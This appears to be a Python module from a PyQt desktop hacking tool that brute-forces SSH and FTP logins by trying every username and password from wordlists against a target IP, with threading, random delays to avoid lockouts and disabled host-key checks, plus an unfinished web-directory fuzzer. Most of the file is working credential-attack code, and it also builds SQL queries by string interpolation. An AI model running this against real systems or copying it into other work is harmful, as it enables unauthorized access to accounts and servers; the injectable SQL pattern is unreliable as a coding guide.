## NOTENOTE: Just write the combos to a file... its easier

from PyQt5.QtCore import QRunnable, Qt, QThreadPool, QObject, QThread, pyqtSignal
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

import time
import random
import requests
import numpy as np
import sqlite3
import os
import queue
        
import itertools  

## Connection Libs
from ftplib import FTP
import paramiko
paramiko.util.log_to_file("main_paramiko_log.txt", level = "INFO") ## Tells paramiko to shut up


import Modules.General.utility as utility

## Use Yeild for progress updates to the bar


class Bruteforce(QObject):
    module_error = pyqtSignal(list)
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    goodcreds = pyqtSignal(list)    
    
    live_attempts = pyqtSignal(str) 
    current_batch = pyqtSignal(list)
    num_of_batches = pyqtSignal(list)
    errlog = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.H = utility.Host()
        
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.good_creds = []
        
        self.bruteforce_progress = 0
        self.number = 0
    
    def error(self, Error, Severity, Message):
        print("ERRORRRRRR")
        error_list = [Error, Severity, Message]
        print(error_list)
        ## Emiting back to main thread
        
        self.module_error.emit(error_list)
        self.finished.emit()
        
    def success(self, username, password):
        ## Done as a tuple to reduce mem size + so it can be appended
        self.good_creds.append((username, password))
        self.goodcreds.emit(self.good_creds)

    def thread_quit(self):
        print("EXIT")
        self.thread_quit = True
        self.errlog.emit("Stopping BruteForce")
        #exit()
        
    def fileopen(self, dir):
        import chardet
        
        with open(dir,"rb") as file_bytes:
            file_read_bytes = file_bytes.read()
            
            encoding= chardet.detect(file_read_bytes)
            decode_type =  encoding['encoding']
            print(decode_type)
            
            file = file_read_bytes.decode(decode_type)
            #file = file_raw.decode('utf-8')
            self.errlog.emit(f"File Encoding: {decode_type}")
            return file
        
    def generate_creds(self, usernames, passwords):
        for username in usernames:
            for password in passwords:
                yield (username, password)
             
    def worker(self, creds):
        pass
    def bruteforce_framework(self, input_list):
        try:
            print("STARTED BF")
            
            #self.GUI.ERROR("low", "error","something")
            
            self.Date = utility.Timestamp.UTC_Date()
            self.Time = utility.Timestamp.UTC_Time()
            
            self.errlog.emit("Date:" + str(self.Date))
            self.errlog.emit("Time:" + str(self.Time))
            
            ## Breaking the list up
            
            self.IP = input_list[0]
            self.port = input_list[1]
            protocol = input_list[2]
            user_wordlist_dir = input_list[3]
            pass_wordlist_dir = input_list[4]
            self.delay = input_list[5]
            self.max_threads = input_list[6]
            self.batchsize = input_list[7]
            
            
            user_list = []
            self.pass_list = []
            self.dir_list = []
            
            
            ## Results list
            self.results_dir_list = []
            
            
            ## Creating target list - I know I could just use the input_list, however this cuts down on the amount of arguments I need to enter in each method
            #target_list = [ip, port, delay]
            
        except Exception as e:
            print(e)
            #self.error(e,"??","??")
            exit()

        username = self.fileopen(user_wordlist_dir)
        password = self.fileopen(pass_wordlist_dir)
                    
        user_list_len = username.split()
        pass_list_len = password.split()
        self.total_combos = len(user_list_len) * len(pass_list_len)
            
        userpass_combo = itertools.product(username.split(),password.split())
        
        print("BatchQueued")
        batch_size = self.batchsize
        batchnum = 0
        total_batches = round((len(user_list_len) * len(pass_list_len))/batch_size)

        for i in range(0, len(user_list_len) * len(pass_list_len), batch_size):
            if self.thread_quit == True:
                break
            else:
                batch = list(itertools.islice(userpass_combo, batch_size))
                ## GUI stuff
                batchnum = batchnum + 1
                self.current_batch.emit(batch)
                self.num_of_batches.emit([batchnum, total_batches])
                
            ## Deciding which processor to use     
                if protocol == "SSH":
                    self.ssh_processor(batch)
                if protocol == "FTP":
                    self.ftp_processor(batch)
                    
    def ssh_processor(self, batch):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for i in batch:
                ## Max workers needs fine tunning/an option for how many threads
                ## Generator to help cut down on ram usage
                #print(i)
                ssh_thread = executor.submit(self.ssh, i)
                    
            #print("BatchQueued")
            ssh_thread.result()
            self.done = True
            #self.H.sys_notification(["TITLE",f"FTP Bruteforce Completed\n {len(self.good_creds)} valid credential(s) found!"])

    def ftp_processor(self, batch):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for i in batch:
                ## Max workers needs fine tunning/an option for how many threads
                ## Generator to help cut down on ram usage
                #print(i)##<< prints each attempt
                ftp_thread = executor.submit(self.ftp, i)
                    
            #print("BatchDone")
            ftp_thread.result()
            self.done = True

    def ftp(self, creds):
        username = creds[0]
        password = creds[1]
        
        try:
            time.sleep(random.uniform(0,self.delay))
            
            ftp = FTP(self.IP, timeout=.1)
            ftp.login(username, password)
            ftp.close() ## Close is a bit harsher than quit, but quits it asap
            
            self.success(username, password)
            
        ## Blind exception becuase this will happen SO often
        except TimeoutError:
            pass
        
        except Exception as e:
            #print(e)
            self.errlog.emit(str(e))
            #print("END")
            try:
                ftp.close()
            except:
                pass
                #self.errlog.emit("Could Not close FTP session")
            #self.error(e,"low","testerror")
            
        finally:
            try:
                ftp.close()
            except:
                pass
                #self.errlog.emit("Could Not close FTP session")

            self.bruteforce_progress = self.bruteforce_progress + 1
            self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
        
            ## Live update in GUI, if num is 0 it was unsuccessful
        self.number = self.number + 1
        if self.number == 1:
            self.live_attempts.emit(username + ":" + password)
            self.number = 0

    def ssh(self, creds):

        _username = creds[0] # _ for namespace reasons
        _password = creds[1]
        
        try:
            time.sleep(random.uniform(0,self.delay))
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ## Ignoring known hosts
            client.connect(self.IP, username=_username, password=_password, timeout=10, banner_timeout=200)
            client.close()
            
            self.success(_username, _password)
            
        ## Blind exception becuase this will happen SO often
        except TimeoutError:
            pass
        
        except Exception as e:
            print(e)
            #self.error(e,"low","testerror")
        
        finally:
            #client.close()

            self.bruteforce_progress = self.bruteforce_progress + 1
            self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
        
            ## Live update in GUI
        self.number = self.number + 1
        if self.number == 1:
            print(_username + _password)
            self.live_attempts.emit(_username + ":" + _password)
            self.number = 0


    ## this does not go in the creds gui, but in the webdir one
    def webdir(self, target_list, dir):
        #target list = [ip, port]
        ## Rate limiter so you don't get kicked out
        time.sleep(np.random.uniform(.001,.01)) 
        
        base_url = target_list[0]
        
        if target_list[1] == None:
            target_list[1] = 80
        
        target_url = f"http://{base_url}:{target_list[1]}/{dir}"
        r = requests.get(target_url)
        
        print(target_url)
        
        if r.status_code == 200:
            ##Successlist.append(target_url or somthing)
            
            
            #print(target_url)
            #self.results_dir_list
            
            '''
            database_write(
                self.GUI,
                [
                    target_url,
                    base_url,
                    target_list[1],
                    r.status_code,
                    self.Date,
                    self.Time
                ])'''

        
        #pass
        # requests module, or something faster
        
        ## if code != 404:
            ##list.append(dir)

class Webdir:
    
    def __init__(self):
        pass
    
    def webdir_framework(self, target_list):
        ## Get input
        pass        


    def webdir_request(self, request_list):
        
        ip = request_list[0] ## Currently unusued
        port = request_list[1]
        fuzzvalue = request_list[2]
        raw_url = request_list[3]

        ## Rate limiter so you don't get kicked out, make the max value editable in GUI
        time.sleep(np.random.uniform(.001,.01)) 
        
        base_url = request_list[0]
        
        # backup Port Handler
        if request_list[1] == None:
            request_list[1] = 80
        
        ## Replacing "FUZZ" with whatever fuzzvalue is passed in
        target_url = raw_url.replace("FUZZ",fuzzvalue)
        
        try:
            r = requests.get(target_url)
        except Exception as e:
            print("Failed to connect, does not exist")
            pass
        
        print(target_url)
        
        #if r.status_code == 200:


## Need to just emit things back, this causes a segfault
def database_write(GUI, db_input_list):
    try:
        ## Accesing DB in root dir
        bruteforce_sqliteConnection = sqlite3.connect(os.path.dirname(__file__) + '/../../logec_db')
        cursor = bruteforce_sqliteConnection.cursor()
        print("Successfully Connected to SQLite")
        
        ## QUick Data Fixes:


        sqlite_insert_query = f"""INSERT INTO 'BRUTEFORCE-http' (URL, IP, PORT, CODE, DATE, TIME) 
        VALUES
        ('{db_input_list[0]}','{db_input_list[1]}','{db_input_list[2]}','{db_input_list[3]}','{db_input_list[4]}','{db_input_list[5]}')""" ## idfk - had to manually set the '' for some reason
        
        print(sqlite_insert_query)

        #count = cursor.execute(sqlite_insert_query)
        cursor.execute(sqlite_insert_query)
        bruteforce_sqliteConnection.commit()
        cursor.close()
        
    except sqlite3.Error as error:
        GUI.ERROR(error, "Medium", "?")
        print("Failed to insert data into sqlite table", error)
        
    finally:
        if bruteforce_sqliteConnection:
            bruteforce_sqliteConnection.close()
            #print("The SQLite connection is closed")

##B = Bruteforce()

##B.framework(["127.0.0.1","22","webdir","userlist","passlist"])

## holy f ssh is picky as hell